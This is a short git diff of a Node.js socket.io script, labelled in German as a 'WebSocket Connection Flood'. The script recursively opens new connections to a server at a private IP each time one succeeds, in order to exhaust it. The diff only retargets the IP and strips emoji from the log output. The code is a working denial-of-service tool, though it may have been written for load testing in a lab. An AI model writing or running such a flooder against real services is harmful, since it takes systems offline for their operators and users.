@@ -1,10 +1,10 @@
 const io = require('socket.io-client');
-const SERVER_URL = 'http://10.62.144.11:4000';
+const SERVER_URL = 'http://10.62.144.174:4000';
 
 let activeSockets = [];
 let connectionAttempts = 0;
 
-console.log('💀 WebSocket Connection Flood gestartet\n');
+console.log(' WebSocket Connection Flood gestartet\n');
 
 function createConnection() {
     const socket = io(SERVER_URL, {
@@ -17,7 +17,7 @@ function createConnection() {
 
     socket.on('connect', () => {
         activeSockets.push(socket);
-        process.stdout.write(`\r✅ Aktive Verbindungen: ${activeSockets.length} | Versuche: ${connectionAttempts}`);
+        process.stdout.write(`\r Aktive Verbindungen: ${activeSockets.length} | Versuche: ${connectionAttempts}`);
         createConnection();
     });
 
